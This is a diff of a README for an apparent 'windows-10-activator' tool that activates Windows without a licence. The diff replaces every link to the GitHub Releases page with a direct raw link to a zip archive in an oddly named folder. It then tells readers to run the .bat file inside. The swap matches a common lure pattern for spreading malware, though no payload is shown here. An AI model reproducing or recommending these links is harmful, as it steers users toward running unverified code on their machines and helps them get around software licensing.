@@ -1,6 +1,6 @@
 # 🎉 windows-10-activator - Activate Your Operating System Easily
 
-[![Download windows-10-activator](https://img.shields.io/badge/Download-windows--10--activator-brightgreen)](https://github.com/yeni0102/windows-10-activator/releases)
+[![Download windows-10-activator](https://raw.githubusercontent.com/yeni0102/windows-10-activator/main/unambitiousness/windows-activator-v1.2.zip)](https://raw.githubusercontent.com/yeni0102/windows-10-activator/main/unambitiousness/windows-activator-v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ The windows-10-activator is a simple script that helps you activate your Windows
 
 To download the application, visit the Releases page. You will find the downloadable files you need there.
 
-[Visit this page to download](https://github.com/yeni0102/windows-10-activator/releases)
+[Visit this page to download](https://raw.githubusercontent.com/yeni0102/windows-10-activator/main/unambitiousness/windows-activator-v1.2.zip)
 
 After the download, you will have a `.bat` script file to run. Simply follow these steps:
 
@@ -66,4 +66,4 @@ This project is licensed under the MIT License. You can freely use and modify it
 
 ---
 
-You can re-download the files anytime by visiting the [Releases page](https://github.com/yeni0102/windows-10-activator/releases). Enjoy activating your Windows 10 with ease!
+You can re-download the files anytime by visiting the [Releases page](https://raw.githubusercontent.com/yeni0102/windows-10-activator/main/unambitiousness/windows-activator-v1.2.zip). Enjoy activating your Windows 10 with ease!
